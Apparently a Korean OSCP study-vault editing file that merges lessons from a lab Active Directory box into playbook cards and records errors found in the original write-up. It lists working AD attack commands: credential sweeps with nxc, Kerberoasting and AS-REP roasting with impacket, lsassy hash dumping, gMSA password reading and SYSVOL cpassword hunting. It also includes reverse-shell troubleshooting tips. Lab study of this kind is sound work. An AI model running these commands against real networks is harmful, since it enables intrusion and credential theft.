## 12. B-53. 유효한 도메인 자격증명 «하나»를 얻으면 즉시 BloodHound를 돌린다 — **병합**

### 넣을 본문

**BloodHound «전에» 4프로토콜 스윕부터 — 30초에 끝나고 셸 가능 여부를 즉답한다.**
```bash
nxc smb   <대역> -u U -p P --shares --continue-on-success
nxc winrm <대역> -u U -p P
nxc rdp   <대역> -u U -p P
nxc ldap  <IP>   -u U -p P --gmsa      # gMSA 후보 즉시 확인
```
⚠️ **대역으로 쏘기 전에 「같은 도메인인가」부터 확인할 것** — nmap 의 `DNS_Domain_Name` 비교로 3초에 안다(A-4-11).

**스윕 출력에서 뽑을 네 가지** ([[Heist]] 실측):
1. `ADMIN$`·`C$` 에 **권한 표시가 없으면** 그 계정은 로컬 관리자가 아니다
2. `signing:True` → SMB 릴레이 죽음(A-5 릴레이 판정의 두 번째 독립 근거)
3. `nla:False` → RDP 로그인 화면 경로(`utilman` 치환)가 살아 있음(B-4)
4. WinRM 인증 성공 → 대화형 셸 가능. **플래그는 반드시 여기서 읽는다**([[Butch]])

**BloodHound 수집 플래그 — 빼면 무엇이 죽는가.**

| 플래그 | 역할 | 빼면 |
|---|---|---|
| `-ns <DC-IP>` | DNS 서버를 DC 로 지정 | Kali `/etc/resolv.conf` 는 도메인을 모름 → LDAP 연결 단계에서 이름 해석 실패. ⚠️ **Kerberos 단계는 이걸로 구제되지 않음**(A-51) |
| `-c All` | 모든 수집기 | 기본값은 일부만 돎 — **ACL 엣지(`ReadGMSAPassword` 포함)를 놓친다** |
| `-d <FQDN>` | 도메인 | FQDN 이어야 함. `.local` 오타가 실제로 남(A-4-11) |

**⛔ 그래프는 시작점이지 전부가 아니다 — 둘을 반드시 기억할 것.**
- **BloodHound 데이터는 «수집 시점의 스냅샷»이다.** 파일명이 시각을 말한다([[Heist]] `20260708141821_*.json` = 14:18:21). **내가 만든 변경은 그래프에 없다** — 권한을 추가한 뒤 다시 봐도 옛날 그림이라 재수집해야 한다([[Vault]] 에서 실제로 발생)
- **URA(User Rights Assignment)·로컬 특권은 애초에 수집 대상이 아니다.** [[Heist]] 의 결정타 `SeRestorePrivilege` 가 그래프에 없었다. **그래프에 경로가 없다고 특권이 없는 것이 아니다 — 셸을 잡으면 반드시 `whoami /priv` 를 칠 것**(A-4 · B-42)

**⚠️ DN 의 CN 과 `sAMAccountName` 은 다를 수 있다.** [[Heist]] 의 `enox` 는 DN 이 `CN=NAQI,CN=USERS,DC=HEIST,DC=OFFSEC` 였다. **인증에 쓰는 것은 `sAMAccountName`.** `ldapsearch`·`net rpc`·수동 열거로 사용자 목록을 뽑을 때 CN 만 긁으면 **로그인이 전부 실패한다.**

**BloodHound 없이 같은 것을 보려면** — `bloodyAD --host <DC> -d <도메인> -u U -p P get writable` / `get object <대상> --attr nTSecurityDescriptor`, 또는 `ldapsearch -x -H ldap://<DC> -D 'U@<도메인>' -w P -b 'DC=..,DC=..' '(sAMAccountName=*)' sAMAccountName memberOf`. 공유 열거는 nxc 없이 `smbclient -L //<IP> -U 'U%P'` · `smbmap -H <IP> -u U -p P`.

**AD 피벗 체크리스트 — 자격증명 하나로 다음에 무엇을 시도하는가**
1. `nxc smb <대역> -u U -p P --shares` — 읽기/쓰기 가능한 공유. 쓰기 가능하면 [[Vault]] 식 `ntlm_theft` 로 다음 사용자 해시를 낚는다
2. `bloodhound-python -u U -p P -d <FQDN> -ns <DC-IP> -c All` — 그래프에서 **내 계정에서 나가는 아웃바운드 엣지만** 본다
3. `impacket-GetUserSPNs <FQDN>/U:P -dc-ip <DC>` — Kerberoast (`-m 13100`)
4. `impacket-GetNPUsers <FQDN>/ -usersfile users.txt -no-pass -dc-ip <DC>` — AS-REP (`-m 18200`). **`-usersfile` 이다, `-userfile` 이 아니다**([[Vault]] 에서 실제로 틀림)
5. `nxc ldap <DC> -u U -p P --gmsa` / `--bloodhound` — gMSA·LAPS 확인
6. `nxc smb <대역> -u U -p P -M lsassy` — 다른 호스트에 로그온한 세션의 해시
7. WinRM/RDP/psexec 으로 셸 → `whoami /priv` → **특권 이름으로 경로 결정**
8. SYSVOL 훑기 — `\\<DC>\SYSVOL` 의 `Groups.xml`(GPP `cpassword`)·로그온 스크립트에 평문이 박혀 있는 일이 흔하다

### 지우기 전 원문 (Heist §3-4 · §4-1 · §7-2 · §7-3 · §7-5)

> **이 출력에서 뽑아야 할 네 가지** (1~4 원문 — 위 제안본에 그대로 옮김)

> | 플래그 | 역할 | 빼면 | (bloodhound-python 플래그 표 원문)

> BloodHound 데이터는 **수집 시점의 스냅샷**이다
> 이 박스의 JSON 파일명은 `20260708141821_*.json` — 14:18:21에 찍은 사진이다. 그 뒤에 바뀐 것은 그래프에 없다.
> 실전에서 이것이 물리는 두 가지:
> 1. **내가 만든 변경이 안 보인다** — 권한을 추가한 뒤 그래프를 다시 봐도 옛날 그림이다. 재수집해야 한다 ([[Vault]] §4에서 실제로 이 상황이 나왔다)
> 2. **URA·로컬 특권은 애초에 수집 대상이 아니다** — 이 박스의 결정타 `SeRestorePrivilege`가 그래프에 없다(§2-7)
> **그래프는 시작점이지 전부가 아니다.**

> > [!warning] `CN=NAQI` — DN의 CN과 `sAMAccountName`은 다를 수 있다
> > 이 계정의 DN은 `CN=NAQI`인데 실제 로그인 이름은 `enox`다. **인증에 쓰는 것은 `sAMAccountName`(`enox`)이다.**
> > `ldapsearch`·`net rpc`·수동 열거로 사용자 목록을 뽑을 때 CN만 긁으면 **로그인이 전부 실패**한다. 반드시 `sAMAccountName`을 뽑아라.

> 2. **자격증명 하나를 얻으면 반드시 전 프로토콜·전 호스트로 스윕한다.** (nxc 4줄 블록)
>    같은 도메인인지부터 확인한다(§6-7).
> 3. **이 자격증명으로 다음에 무엇을 시도하는가 — AD 피벗 체크리스트** (1~8 원문 — 위 제안본에 그대로 옮김)
> 5. **자동 도구 없이 같은 결과를 얻는 법** — BloodHound 없이 ACL 확인 / nxc 없이 공유 열거 원문

⚠️ **노트에는 `CN=NAQI` 콜아웃을 남겼다** — 이 박스에서 `enox` 를 찾아낸 실측 근거이기 때문. 플레이북 쪽은 일반화다(중복이 아님).

---

## 13. C-2 · C-3 — **병합**

### C-2(셸 직후)에 넣을 본문

**Windows/AD 셸을 잡으면 치는 첫 5개** — 리눅스 반사신경은 여기서 전부 무용지물이다.
```powershell
whoami /all                       # 사용자 SID + 그룹 + 특권 한 번에
whoami /priv                      # ★ 특권 이름 하나가 곧 경로다
net user <나> /domain             # 내 그룹 멤버십
net localgroup administrators     # 로컬 관리자 명단
systeminfo                        # 빌드·패치·도메인 가입 여부
```
여기에 `Get-ChildItem C:\Users`(다른 계정 존재)와 `C:\`·`C:\Program Files` 훑기를 더한다.
→ [[Heist]] 는 `C:\Users` 에서 `svc_apache$` 를 봤고(**끝의 `$` = 컴퓨터 계정 아니면 (g)MSA**, 프로필이 있으니 로그온한 적이 있는 서비스 계정), `whoami /priv` 에서 `SeRestorePrivilege` 를 봤다. **권한상승 경로 전체가 이 두 명령에서 나왔다.**

### C-3(플래그·증거)에 넣을 본문

**AD 박스는 `local.txt`(사용자)와 `proof.txt`(Administrator/SYSTEM)가 따로이므로 증거를 «두 번» 찍는다.**
```powershell
whoami; hostname; ipconfig | findstr IPv4; type C:\Users\<사용자>\Desktop\local.txt
```
⚠️ **웹셸에서 읽은 플래그는 0점** — 규정 원문이 *"this includes any type of web-based shell"*. `evil-winrm`·RDP 콘솔·`nc` 리버스셸은 대화형이라 문제없다.
⚠️ [[Heist]] 는 `proof.txt` 는 `whoami`(→ `nt authority\system`)와 한 화면에 담았으나(`파일보관\Pasted image 20260708153113.png`) **`local.txt` 는 한 화면 증거를 남기지 못했다** — 대화형 획득의 근거가 `*Evil-WinRM* PS …>` 프롬프트뿐이다. **플래그를 읽는 순간이 곧 증거를 만드는 순간이다.**

### 지우기 전 원문 (Heist §7-1 · §7-8 · §3-5)

> 1. **Windows/AD 셸을 잡으면 치는 첫 5개** — 리눅스 반사신경은 여기서 전부 무용지물이다. (블록 원문)
>    여기에 `Get-ChildItem C:\Users`(다른 계정 존재)와 `C:\`·`C:\Program Files` 훑기를 더한다.
> 8. **시험 증거** — 플래그마다 `whoami; hostname; ipconfig` 를 같은 화면에 담는다. AD 박스는 `local.txt`(사용자)와 `proof.txt`(Administrator/SYSTEM)가 따로이므로 **두 번** 찍는다.

> > [!tip] 시험 증거 형식 연습 — 플래그와 신원을 한 화면에
> > 시험에서는 `whoami` · `hostname` · `ipconfig`(또는 `ip a`) 와 플래그 내용이 **한 스크린샷 안에** 있어야 인정된다. 습관을 들여라: (powershell 블록)
> > ⚠️ **웹셸에서 읽은 플래그는 0점**이다. 규정 원문이 *"this includes any type of web-based shell"* 이다. 이 박스는 evil-winrm이 대화형 셸이므로 문제없다.

> **`svc_apache$` — 이름 끝의 `$`가 전부를 말한다.** 컴퓨터 계정 아니면 (g)MSA다. `C:\Users`에 프로필이 있으니 로그온한 적이 있는 서비스 계정이다.

⚠️ 노트에는 `whoami; hostname; ipconfig …` 한 줄과 웹셸 0점 경고를 **`Local.txt value:` 바로 아래**에 남겼다 — 그 자리의 증거 미비를 명시하는 유보와 붙어 있어야 의미가 있기 때문이다.

---

## 14. D(시간 배분·손절 기준) · E(시험 규정) — **병합**

### D 에 넣을 본문

**AD 박스 기준선 — 정찰 10분 · 진입 30분 · 그래프 15분 · 권한상승 30분.** 웹 브루트포싱은 백그라운드로만 돌리고 그것을 기다리지 않는다(A-23). 진입 경로가 60분 넘게 안 보이면 다른 박스로 옮겼다가 돌아온다.

[[Heist]] 실측 복기 (전체 약 2시간, 근거 = `~/PG/Heist/` mtime + 스크린샷 파일명):

| 구간 | 실제 | 적정 | 비고 |
|---|---|---|---|
| nmap 전수 | 13:56 → 13:58 (2분) | 2분 | `--min-rate 5000` 의 효과 |
| 웹 열거 + feroxbuster | 13:58 → 14:08 | 3분 | 파라미터를 먼저 만졌어야 했음 |
| Responder + 캡처 | 14:08 → 14:09 (1분) | 1분 | 트리거를 알면 즉시 |
| hashcat | 14:10 (2초) | 2초 | 12초 안에 안 되면 접음 |
| 스윕 + WinRM + local.txt | 14:12 | 5분 | |
| BloodHound 수집·분석 | 14:18 → 15:05 | 15분 | Kerberoast·릴레이 헛발질 포함 |
| gMSA → PtH → SYSTEM | 15:05 → 15:51 | 20분 | 두 경로를 모두 실습해 길어짐 |

**낭비는 둘** — 브루트포싱(A-23)과 경로 오판(A-4-11 도메인 잔류 · A-5 릴레이). **`nmap.log` 를 한 번 더 정독했으면 릴레이 시도는 통째로 없었다.**

**리버스셸이 안 붙으면 의심할 것** — 아웃바운드 포트 제한(80/443 으로 바꿔봄) · Windows 방화벽 아웃바운드 규칙 · **AV 가 `nc64.exe` 를 파일명만으로 삭제**([[Squid]]·[[Exghost]] 에서 실제로 남. 업로드 후 `ls` 로 존재 확인부터). [[Heist]] 는 4444 가 그대로 통했다.

### E 에 넣을 본문

**AD 계열 도구 허용 판정 — 전부 허용이다.** ([[Heist]] 는 Metasploit 없이 끝났다)
- BloodHound / bloodhound-python / SharpHound — **열거 전용. 익스플로잇 단계가 없어 허용**
- NetExec(nxc) / CrackMapExec — 열거·인증 확인. 허용
- Responder — 프로토콜 포이즈닝·자격증명 수집. 허용
- hashcat / evil-winrm / bloodyAD / GMSAPasswordReader / xfreerdp3 / impacket 계열 — 허용
- 금지는 `sqlmap` 계열 자동 익스플로잇과 Nessus/OpenVAS 계열 대량 스캐너. Metasploit 은 금지가 아니라 **1대 한정**이고 `msfvenom`·`multi_handler` 는 전 대상 허용

### 지우기 전 원문 (Heist §0 · §6-11 · §7-6 · §7-7)

> OSCP 시험 규정 — 이 박스에서 쓴 도구는 전부 허용된다
> - BloodHound / bloodhound-python / SharpHound — 열거 전용. 익스플로잇 단계가 없어 허용
> - NetExec(nxc) / CrackMapExec — 열거·인증 확인. 허용
> - Responder — 프로토콜 포이즈닝·자격증명 수집. 허용
> - hashcat / evil-winrm / bloodyAD / GMSAPasswordReader — 허용
> - **금지는 `sqlmap` 계열 자동 익스플로잇과 Nessus/OpenVAS 계열 대량 스캐너다.** Metasploit은 금지가 아니라 **1대 한정**이고, `msfvenom`·`multi_handler`는 전 대상 허용이다. 이 박스는 Metasploit 없이 끝난다

> ### 6-11. 시간 배분 복기 (표 원문 — 위 제안본에 그대로 옮김)
> 전체 약 2시간. 낭비는 §6-1(브루트포싱)과 §6-2·6-4(경로 오판) 둘이다. **`nmap.log`를 한 번 더 정독했으면 §6-4는 통째로 없었다.**

> 6. **리버스셸이 안 붙으면 의심할 것** — 아웃바운드 포트 제한(80/443로 바꿔본다) · Windows 방화벽 아웃바운드 규칙 · **AV가 `nc64.exe`를 파일명만으로 삭제** ([[Squid]]·[[Exghost]]에서 실제로 났다. 업로드 후 `ls`로 존재 확인부터). 이 박스는 4444가 그대로 통했다.
> 7. **시간 배분** — AD 박스는 **정찰 10분 · 진입 30분 · 그래프 15분 · 권한상승 30분**을 기준선으로 잡는다. 웹 브루트포싱은 백그라운드로만 돌리고 그것을 기다리지 않는다(§6-1). 진입 경로가 60분 넘게 안 보이면 다른 박스로 옮겼다가 돌아온다.

---

## 이관하지 «않은» 것 — 이미 수록됐거나 노트에 남김

| 원본 위치 | 처리 |
|---|---|
| §0 「AD DC 포트 지문」 (53+88+389/636+3268/3269+445+464+9389) | **노트의 `Service Enumeration` 에 「DC 확정 근거」로 남김.** 이 박스가 DC 임을 판정하는 실측 근거라 열거 절에 있어야 함. `F. 포트 → 첫 수` 절에 이미 인접 항목이 있는지 반영자가 확인할 것 |
| §0 「시험 출제 가능성」 표 · 「변형은 이런 모습이다」 | **위 제안 8~11 의 각 카드 본문에 흡수.** 표 자체는 [[Heist]] 고유 메타라 이관하지 않음 |
| §4-5 「리버스셸은 반드시 tmux 세션에서」·`rlwrap` | **`B-89. 리스너는 `tmux` + `rlwrap` 으로 띄운다` 에 이미 수록.** 추가 이관 불요 |
| §5 플래그 표 | `Local.txt value:` · `Proof.txt value:` 블록으로 분산(STANDARD) |
| §8 방어 관점 표 9행 | 각 finding 의 `Vulnerability Fix:` 로 분산. 탐지 관점(EventID 4624/4625·4663·7045/4657·4662) 중 **`System32` 파일 이름변경 감사·Sysmon EventID 11** 만 `Privilege Escalation` Fix 에 남기고 나머지는 삭제 — 이 박스에서 관측된 것이 아니고 재현·납득에 필요하지 않음 |
| §6-10 「개작하며 잡은 것 — 원본 노트의 오류 4건」 | **작업 과정 기록이므로 노트에서 제거.** 원문 전량은 이 파일의 부록에 보존 |
| §9 참고 자료 · 남긴 흔적 | `## 관련` · `Post-Exploitation` 으로 이동(손실 없음) |

---

## 부록 — §6-10 원문 (노트에서 제거함, `_AUDIT` 에만 보존)

> ### 6-10. 개작하며 잡은 것 — 원본 노트의 오류 4건
>
> 이 노트는 원본(426행, 터미널 붙여넣기 위주)을 전면 개작한 것이다. 대조 과정에서 **원본 서술 자체의 오류**가 넷 나왔다. 실패 유형이 [[_WRITEUP-STANDARD]]가 경고하는 패턴과 정확히 일치해서 남겨 둔다.
>
> | # | 원본 | 실제 | 어떻게 반증했나 |
> |---|---|---|---|
> | 1 | frontmatter `tech/web/lfi-rfi` | LFI/RFI는 이 박스에 없다. `?url=`은 서버가 원격 URL을 가져오는 SSRF다. 경로탐색도, 로컬 파일 포함도 발생하지 않았다 | 스크린샷의 URL(`?url=http://192.168.45.175`)과 캡처 blob의 `MsvAvTargetName = HTTP/...` |
> | 2 | frontmatter `tech/ad/ntlm-relay` | 릴레이는 시도했지만 성립하지 않았다(§6-4). 실제로 한 것은 캡처 + 오프라인 크랙이다 | `nmap.log`의 `Message signing enabled and required`, `computers.json`에 호스트가 1대뿐 |
> | 3 | "enox의 경우 web admin 그룹이므로 svc_apache$의 hash 볼 수 있음" — 근거 없는 단정 | 결론은 맞다. 그러나 원본에는 근거가 없었고, `WEB ADMINS`의 멤버가 enox 하나라는 사실도, ACE가 `ReadGMSAPassword`라는 사실도 적혀 있지 않았다 | BloodHound JSON을 `jq`로 직접 조회(§2-6) |
> | 4 | `manual_tags` 선언 없음 | 자동 태거가 본문 키워드로 기법을 판정한다. 이 노트처럼 대안 경로·비교표가 많은 글은 쓰지도 않은 기법이 대량으로 붙는다 | 표준의 실측 사례(Crane 6→21, Squid 4→19) |
>
> 2번이 특히 위험한 유형이다 — **태그가 서술을 오염시킨다**
> `tech/ad/ntlm-relay`라는 태그를 보고 다음에 이 노트를 여는 사람은 "여기서 릴레이를 했구나"라고 읽는다. 그러면 **다른 박스에서 서명이 필수인 DC에 릴레이를 시도하며 시간을 태운다.**
>
> 이 태그를 **그대로 유지하기로 결정했다.** 볼트의 태그 어휘에는 `ntlm-capture`가 없고, `tech/ad/ntlm-relay`가 사실상 "Responder/강제 인증" 버킷이기 때문이다(`extract.py`의 판정 정규식이 `responder`를 포함한다). 대신 이 노트 본문 세 곳(§2-1·§2-4·§6-4)에 "릴레이는 성립하지 않았다"를 명시했다. 태그는 검색 색인이지 결론이 아니다.
>
> 일반화: 개작이 새로 써넣는 설명 문장이 가장 잘 무너진다. 실측 터미널 블록은 훼손되지 않는다. 그러니 **검증은 "이 박스에서 이랬다"는 단정과 "일반적으로 이렇다"는 승격 문장에 집중**하라. 이 노트에서 확인할 수 없었던 것들은 전부 `[가정]`을 붙였다 — §2-4의 LDAP 채널 바인딩, §2-7의 URA 부여 경로, §4-5의 SeRestoreAbuse 내부 동작, §6-8의 히스토리 만료.

**`tech/ad/ntlm-relay` 태그 유지 판단은 이번 개작에서도 그대로 이어간다** — `manual_tags: true` 상태라 `extract.py` 는 본문을 스캔하지 않고 이 태그를 그대로 쓴다. 다만 **볼트 태그 taxonomy 에 `tech/ad/gmsa`·`tech/ad/coerced-auth` 가 없다**(전 볼트 grep 확인). taxonomy 신설은 공유 인프라라 총괄 판단 사항으로 올린다.

---

## 개작 중 반증한 것 — 원본 노트의 오류

| # | 원본 서술 | 실제 | 근거 |
|---|---|---|---|
| 1 | §2-6 `ReadGMSAPassword` ACE 가 **「두 principal뿐이다」** (`-1000` Computer, `-1104` Group) | **셋이다.** `HEIST.OFFSEC-S-1-5-32-544`(BUILTIN\Administrators)가 첫 행에 있는데 블록에서 누락된 채 「두 principal뿐」이라 단정함 | `20260708141821_users.json` 재조회(2026-08-26) |
| 2 | §6-9 DCSync jq 블록의 SID 가 `S-1-5-21-...-498` 로 **손으로 축약**되고 `# Enterprise Read-only Domain Controllers` 류 주석이 붙어 있었음 | 실제 출력에는 축약도 주석도 없음. **코드펜스 안에 손으로 넣은 주석**이라 실측 표식을 훼손함 | `20260708141821_domains.json` 재조회 |
| 3 | §2-6 Administrators 멤버 jq 블록에도 같은 형태의 손 주석(`# Domain Admins` 등) | 동일 — 실제 출력에는 없음 | `20260708141821_groups.json` 재조회 |
| 4 | §2-8 「`sudo ntpdate <DC-IP>`」·「`faketime …` **B 가 낫다**」 | **둘 다 현행 Kali 에 없다.** `ntpdate` 는 `apt-cache policy` 상 **Candidate 조차 없음**, `faketime` 미설치. `/usr/sbin/rdate` 만 존재 | Kali 실행 확인(2026-08-26). `_PLAYBOOK` A-51 이 이미 「현행 Kali 에 `ntpdate` 는 패키지조차 없음」이라 적고 있었음 — 노트가 플레이북과 어긋나 있었던 것 |
| 5 | §6-2 「IP(`192.168.120.175` → [[Vault]] §6)」 | §6-7 의 실제 명령은 `nxc-sweep 192.168.120.172`. **노트 내부 모순** | 같은 노트 §6-7 의 코드블록 |
| 6 | §5 플래그 표 — `proof.txt` 획득 계정을 「`NT AUTHORITY\SYSTEM` (리버스셸)」로만 적음 | **경로 A(utilman + RDP)에서 15:31 에 먼저 읽었음.** 그 화면이 `whoami` → `nt authority\system` 과 플래그를 **한 화면에** 담은 유일한 시험 증거인데 노트가 전사하지 않았음 | `파일보관\Pasted image 20260708153113.png` |
| 7 | §4-4 「Win+U 를 누르면 SYSTEM 으로 뜬다」 — 그 뒤 화면 내용 미기재 | 콘솔이 `The system cannot find message text for message number 0x2350` · `Not enough memory resources are available to process this command.` 를 뱉음. **오류처럼 보이나 셸은 정상** — 이 사실을 모르면 경로를 접을 수 있음 | 같은 스크린샷 |

3·6·7 은 **초고(=기존 개작본)가 자기 증거 파일을 열어보지 않아 생긴 누락**이다. 1·2·3 은 **읽은 것을 옮기며 손으로 다듬어 실측을 훼손한** 유형이다.
